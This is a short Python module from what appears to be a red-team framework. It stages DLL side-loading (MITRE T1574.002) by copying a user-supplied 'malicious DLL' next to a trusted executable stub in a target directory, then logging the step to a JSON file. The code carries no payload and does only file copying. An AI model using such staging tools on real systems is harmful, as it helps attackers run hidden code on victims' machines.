# modules/exploits/dll_sideload_launcher.py

import argparse
import shutil
import os
import json
from datetime import datetime

LOG_PATH = "results/exploit_logs.json"
MITRE_TTP = "T1574.002"  # DLL Side-Loading

def log_sideload(entry):
    os.makedirs("results", exist_ok=True)
    if os.path.exists(LOG_PATH):
        with open(LOG_PATH, "r") as f:
            data = json.load(f)
    else:
        data = []
    data.append(entry)
    with open(LOG_PATH, "w") as f:
        json.dump(data, f, indent=2)

def setup_sideload(target_dir, dll_path, exe_stub):
    os.makedirs(target_dir, exist_ok=True)

    dll_dest = os.path.join(target_dir, os.path.basename(dll_path))
    exe_dest = os.path.join(target_dir, os.path.basename(exe_stub))

    try:
        shutil.copy2(dll_path, dll_dest)
        shutil.copy2(exe_stub, exe_dest)
        print(f"[âœ“] DLL and EXE stub copied to {target_dir}")
    except Exception as e:
        print(f"[!] Failed to copy files: {e}")
        return

    log_sideload({
        "timestamp": datetime.utcnow().isoformat(),
        "target_directory": target_dir,
        "dll": os.path.basename(dll_path),
        "exe": os.path.basename(exe_stub),
        "ttp": MITRE_TTP
    })

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="DLL Sideload Deployment Tool")
    parser.add_argument("--target-dir", required=True, help="Target directory to stage the sideload")
    parser.add_argument("--dll", required=True, help="Malicious DLL to sideload")
    parser.add_argument("--exe", required=True, help="Executable stub (trusted EXE)")
    args = parser.parse_args()

    setup_sideload(args.target_dir, args.dll, args.exe)
